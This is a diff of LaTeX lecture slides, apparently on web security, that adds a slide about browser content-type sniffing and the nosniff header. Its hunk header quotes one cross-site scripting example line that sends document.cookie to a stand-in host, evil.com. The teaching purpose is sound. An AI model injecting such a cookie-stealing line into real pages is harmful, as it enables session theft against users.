@@ -49,4 +49,13 @@ image.src = "https://evil.com/?cookie=" + document.cookie;
 \end{frame}
 
 \begin{frame}{modern content-type inference}
+    \begin{itemize}
+    \item \url{https://mimesniff.spec.whatwg.org/}
+        \begin{itemize}
+        \item attempt at standard rules (rather than every browser doing this differently)
+        \item also handles explicit missing Content-Type
+        \end{itemize}
+    \item \texttt{X-Content-Type-Options: nosniff} essentially disables
+    \item avoid inferring `scriptable' content-types in `upgrade' from text/plain/etc.
+    \end{itemize}
 \end{frame}
